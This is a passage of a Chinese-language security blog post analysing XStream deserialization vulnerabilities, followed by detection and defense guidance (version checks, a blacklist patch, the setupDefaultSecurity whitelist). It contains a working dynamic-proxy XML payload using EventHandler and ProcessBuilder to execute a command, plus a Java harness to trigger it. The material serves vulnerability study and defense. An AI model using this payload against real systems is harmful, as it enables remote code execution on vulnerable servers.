class="keyword">new</span> XStream();</span><br><span class="line">Contact contact = (Contact)xstream.fromXML(xml);</span><br></pre></td></tr></table></figure><p>这种方式是基于服务端解析XML之后会直接调用到XML中interface标签指向的接口类声明的方法，因此这种情形下必然会触发动态代理类对象的恶意方法。</p><h5 id="复现-2"><a href="#复现-2" class="headerlink" title="复现"></a>复现</h5><p>下面我们试下这个payload，ipayload.xml，这个更为简单直接，不需要在dynamic-proxy外再加其他的转换器，直接利用的DynamicProxyConverter转换器来识别：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dynamic-proxy</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">interface</span>&gt;</span>IPerson<span class="tag">&lt;/<span class="name">interface</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">handler</span> <span class="attr">class</span>=<span class="string">"java.beans.EventHandler"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">target</span> <span class="attr">class</span>=<span class="string">"java.lang.ProcessBuilder"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">command</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">string</span>&gt;</span>calc.exe<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">command</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span>&gt;</span>start<span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">handler</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dynamic-proxy</span>&gt;</span></span><br></pre></td></tr></table></figure><p>修改Test.java，将Person类改为IPerson接口类，和ipayload.xml中的interface标签内容相对应：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> FileNotFoundException </span>&#123;</span><br><span class="line"><span class="comment">//        String xml = new Scanner(new File("ipayload.xml")).useDelimiter("\\Z").next();</span></span><br><span class="line">        FileInputStream xml = <span class="keyword">new</span> FileInputStream(<span class="string">"ipayload.xml"</span>);</span><br><span class="line">        XStream xstream = <span class="keyword">new</span> XStream(<span class="keyword">new</span> DomDriver());</span><br><span class="line">        IPerson p = (IPerson) xstream.fromXML(xml);</span><br><span class="line">        p.output();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>还有一点需要注意的是，IPerson接口类必须定义成public即公有的，否则程序运行会报错显示没有权限访问该接口类。</p><p>成功触发：</p><p><img src="/2019/10/21/XStream反序列化漏洞/1.png" alt=""></p><h5 id="无法通杀-lt-1-3-1版本的原因-2"><a href="#无法通杀-lt-1-3-1版本的原因-2" class="headerlink" title="无法通杀&lt;=1.3.1版本的原因"></a>无法通杀&lt;=1.3.1版本的原因</h5><p>尝试攻击会报以下错误，说是不能创建EventHandler类对象、因为其没有无参构造函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Exception in thread &quot;main&quot; com.thoughtworks.xstream.converters.ConversionException: Cannot construct java.beans.EventHandler as it does not have a no-args constructor : Cannot construct java.beans.EventHandler as it does not have a no-args constructor</span><br><span class="line">---- Debugging information ----</span><br><span class="line">message             : Cannot construct java.beans.EventHandler as it does not have a no-args constructor</span><br><span class="line">cause-exception     : com.thoughtworks.xstream.converters.reflection.ObjectAccessException</span><br><span class="line">cause-message       : Cannot construct java.beans.EventHandler as it does not have a no-args constructor</span><br><span class="line">class               : com.thoughtworks.xstream.mapper.DynamicProxyMapper$DynamicProxy</span><br><span class="line">required-type       : java.beans.EventHandler</span><br><span class="line">path                : /dynamic-proxy/handler</span><br><span class="line">-------------------------------</span><br></pre></td></tr></table></figure><h5 id="无法通杀1-4-7-1-4-9版本的原因-2"><a href="#无法通杀1-4-7-1-4-9版本的原因-2" class="headerlink" title="无法通杀1.4.7-1.4.9版本的原因"></a>无法通杀1.4.7-1.4.9版本的原因</h5><p>和前面基于sorted-set的PoC的原因是一样的。</p><h2 id="0x03-检测与防御"><a href="#0x03-检测与防御" class="headerlink" title="0x03 检测与防御"></a>0x03 检测与防御</h2><h3 id="检测方法"><a href="#检测方法" class="headerlink" title="检测方法"></a>检测方法</h3><ol><li>查看目标环境中是否有存在漏洞版本的XStream的jar包，即1.4.x系列版本中&lt;=1.4.6或=1.4.10；</li><li>全局搜索是否存在<code>Xstream.fromXML(</code>的地方，若存在则进一步分析该参数是否外部可控；若为1.4.10版本的还需要确认是否开启了安全配置进行了有效的防御；</li></ol><h3 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h3><ol><li><p>将XStream升级到最新版，即1.4.11之后的版本；</p></li><li><p>若只想手动修改代码，可以参考1.4.7-1.4.9版本的修补方法，在ReflectionConverter.canConvert()函数中添加了对包括EventHandler等类的过滤，当然这只是黑名单过滤方式，存在绕过风险：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">canConvert</span><span class="params">(Class type)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> ((<span class="keyword">this</span>.type != <span class="keyword">null</span> &amp;&amp; <span class="keyword">this</span>.type == type) || (<span class="keyword">this</span>.type == <span class="keyword">null</span> &amp;&amp; type != <span class="keyword">null</span> &amp;&amp; type != eventHandlerType))</span><br><span class="line">    &amp;&amp; canAccess(type);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>若版本号&gt;=1.4.7，XStream提供了一个安全框架供用户使用，但必须手工设置，可以调用addPermission()、allowTypes()、denyTypes()等对某些类进行限制，即建立黑白名单机制进行过滤：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">XStream.addPermission（TypePermission）;</span><br><span class="line">XStream.allowTypes（Class []）;</span><br><span class="line">XStream.allowTypes（String []）;</span><br><span class="line">XStream.allowTypesByRegExp（String []）;</span><br><span class="line">XStream.allowTypesByRegExp（Pattern []）;</span><br><span class="line">XStream.allowTypesByWildcard（String []）;</span><br><span class="line">XStream.allowTypeHierary（Class）;</span><br><span class="line">XStream.denyPermission（TypePermission）;</span><br><span class="line">XStream.denyTypes（Class []）;</span><br><span class="line">XStream.denyTypes（String []）;</span><br><span class="line">XStream.denyTypesByRegExp（String []）;</span><br><span class="line">XStream.denyTypesByRegExp（Pattern []）;</span><br><span class="line">XStream.denyTypesByWildcard（String []）;</span><br><span class="line">XStream.denyTypeHierary（Class）;</span><br></pre></td></tr></table></figure><p>具体的参考：<a href="http://x-stream.github.io/security.html" target="_blank" rel="noopener">http://x-stream.github.io/security.html</a></p></li><li><p>若是1.4.10版本，提供了XStream.setupDefaultSecurity()函数来设置XStream反序列化类型的默认白名单，其本质还是调用XStream提供的安全框架里的addPermission()、allowTypes()、denyTypes()等函数，区别在于自己定义了一些默认白名单，<strong>但必须手工设置，否则还是存在漏洞</strong>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setupDefaultSecurity</span><span class="params">(<span class="keyword">final</span> XStream xstream)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (xstream.insecureWarning) &#123;</span><br><span class="line">        xstream.addPermission(NoTypePermission.NONE);</span><br><span class="line">        xstream.addPermission(NullPermission.NULL);</span><br><span class="line">        xstream.addPermission(PrimitiveTypePermission.PRIMITIVES);</span><br><span class="line">        xstream.addPermission(ArrayTypePermission.ARRAYS);</span><br><span class="line">        xstream.addPermission(InterfaceTypePermission.INTERFACES);</span><br><span class="line">        xstream.allowTypeHierarchy(Calendar.class);</span><br><span class="line">        xstream.allowTypeHierarchy(Collection.class);</span><br><span class="line">        xstream.allowTypeHierarchy(Map.class);</span><br><span class="line">        xstream.allowTypeHierarchy(Map.Entry.class);</span><br><span class="line">        xstream.allowTypeHierarchy(Member.class);</span><br><span class="line">        xstream.allowTypeHierarchy(Number.class);</span><br><span class="line">        xstream.allowTypeHierarchy(Throwable.class);</span><br><span class="line">        xstream.allowTypeHierarchy(TimeZone.class);</span><br><span class="line"></span><br><span class="line">        Class type = JVM.loadClassForName(<span class="string">"java.lang.Enum"</span>);</span><br><span class="line">        <span class="keyword">if</span> (type != <span class="keyword">null</span>) &#123;</span><br><span class="line">            xstream.allowTypeHierarchy(type);</span><br><span class="line">        &#125;</span><br><span class="line">        type = JVM.loadClassForName(<span class="string">"java.nio.file.Path"</span>);</span><br><span class="line">        <span class="keyword">if</span> (type != <span class="keyword">null</span>) &#123;</span><br><span class="line">            xstream.allowTypeHierarchy(type);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> Set types = <span class="keyword">new</span> HashSet();</span><br><span class="line">        types.add(BitSet.class);</span><br><span class="line">        types.add(Charset.class);</span><br><span class="line">        types.add(Class.class);</span><br><span class="line">        types.add(Currency.class);</span><br><span class="line">        types.add(Date.class);</span><br><span class="line">        types.add(DecimalFormatSymbols.class);</span><br><span class="line">        types.add(File.class);</span><br><span class="line">        types.add(Locale.class);</span><br><span class="line">        types.add(Object.class);</span><br><span class="line">        types.add(Pattern.class);</span><br><span class="line">        types.add(StackTraceElement.class);</span><br><span class="line">        types.add(String.class);</span><br><span class="line">        types.add(StringBuffer.class);</span><br><span class="line">        types.add(JVM.loadClassForName(<span class="string">"java.lang.StringBuilder"</span>));</span><br><span class="line">        types.add(URL.class);</span><br><span class="line">        types.add(URI.class);</span><br><span class="line">        types.add(JVM.loadClassForName(<span class="string">"java.util.UUID"</span>));</span><br><span class="line">        <span class="keyword">if</span> (JVM.isSQLAvailable()) &#123;</span><br><span class="line">            types.add(JVM.loadClassForName(<span class="string">"java.sql.Timestamp"</span>));</span><br><span class="line">            types.add(JVM.loadClassForName(<span class="string">"java.sql.Time"</span>));</span><br><span class="line">            types.add(JVM.loadClassForName(<span class="string">"java.sql.Date"</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (JVM.is18()) &#123;</span><br><span class="line">            xstream.allowTypeHierarchy(JVM.loadClassForName(<span class="string">"java.time.Clock"</span>));</span><br><span class="line">            types.add(JVM.loadClassForName(<span class="string">"java.time.Duration"</span>));</span><br><span class="line">            types.add(JVM.loadClassForName(<span class="string">"java.time.Instant"</span>));</span><br><span class="line">            types.add(JVM.loadClassForName(<span class="string">"java.time.LocalDate"</span>));</span><br><span class="line">            types.add(JVM.loadClassForName(<span class="string">"java.time.LocalDateTime"</span>));</span><br><span class="line">            types.add(JVM.loadClassForName(<span class="string">"java.time.LocalTime"</span>));</span><br><span class="line">            types.add(JVM.loadClassForName(<span class="string">"java.time.MonthDay"</span>));</span><br><span class="line">            types.add(JVM.loadClassForName(<span class="string">"java.time.OffsetDateTime"</span>));</span><br><span class="line">            types.add(JVM.loadClassForName(<span class="string">"java.time.OffsetTime"</span>));</span><br><span class="line">            types.add(JVM.loadClassForName(<span class="string">"java.time.Period"</span>));</span><br><span class="line">            types.add(JVM.loadClassForName(<span class="string">"java.time.Ser"</span>));</span><br><span class="line">            types.add(JVM.loadClassForName(<span class="string">"java.time.Year"</span>));</span><br><span class="line">            types.add(JVM.loadClassForName(<span class="string">"java.time.YearMonth"</span>));</span><br><span class="line">            types.add(JVM.loadClassForName(<span class="string">"java.time.ZonedDateTime"</span>));</span><br><span class="line">            xstream.allowTypeHierarchy(JVM.loadClassForName(<span class="string">"java.time.ZoneId"</span>));</span><br><span class="line">            types.add(JVM.loadClassForName(<span class="string">"java.time.chrono.HijrahDate"</span>));</span><br><span class="line">            types.add(JVM.loadClassForName(<span class="string">"java.time.chrono.JapaneseDate"</span>));</span><br><span class="line">            types.add(JVM.loadClassForName(<span class="string">"java.time.chrono.JapaneseEra"</span>));</span><br><span class="line">            types.add(JVM.loadClassForName(<span class="string">"java.time.chrono.MinguoDate"</span>));</span><br><span class="line">            types.add(JVM.loadClassForName(<span class="string">"java.time.chrono.ThaiBuddhistDate"</span>));</span><br><span class="line">            types.add(JVM.loadClassForName(<span class="string">"java.time.chrono.Ser"</span>));</span><br><span class="line">            xstream.allowTypeHierarchy(JVM.loadClassForName(<span class="string">"java.time.chrono.Chronology"</span>));</span><br><span class="line">            types.add(JVM.loadClassForName(<span class="string">"java.time.temporal.ValueRange"</span>));</span><br><span class="line">            types.add(JVM.loadClassForName(<span class="string">"java.time.temporal.WeekFields"</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        types.remove(<span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> Iterator iter = types.iterator();</span><br><span class="line">        <span class="keyword">final</span> Class[] classes = <span class="keyword">new</span> Class[types.size()];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; classes.length; ++i) &#123;</span><br><span class="line">            classes[i] = (Class)iter.next();</span><br><span class="line">        &#125;</span><br><span class="line">        xstream.allowTypes(classes);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Security framework of XStream instance already initialized"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>试下效果，在前面的Demo我们添加这个默认白名单过滤：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> FileNotFoundException </span>&#123;</span><br><span class="line">        FileInputStream xml = <span class="keyword">new</span> FileInputStream(<span class="string">"ipayload.xml"</span>);</span><br><span class="line">        XStream xstream = <span class="keyword">new</span> XStream(<span class="keyword">new</span> DomDriver());</span><br><span class="line">        <span class="comment">// 使用默认白名单过滤</span></span><br><span class="line">        XStream.setupDefaultSecurity(xstream);</span><br><span class="line">        Person p = (Person) xstream.fromXML(xml);</span><br><span class="line">        p.output();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行后会报错，显示禁止反序列化动态代理类，成功修补了漏洞：</p><p><img src="/2019/10/21/XStream反序列化漏洞/30.png" alt=""></p></li></ol><h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><p><a href="http://x-stream.github.io/" target="_blank" rel="noopener">XStream官网</a></p><p><a href="http://www.pwntester.com/blog/2013/12/23/rce-via-xstream-object-deserialization38/" target="_blank" rel="noopener">RCE via XStream object deserialization</a></p><p><a href="https://www.freebuf.com/column/209781.html" target="_blank" rel="noopener">XStream CVE-2019-10173漏洞分析</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
  </entry>
  
</feed>
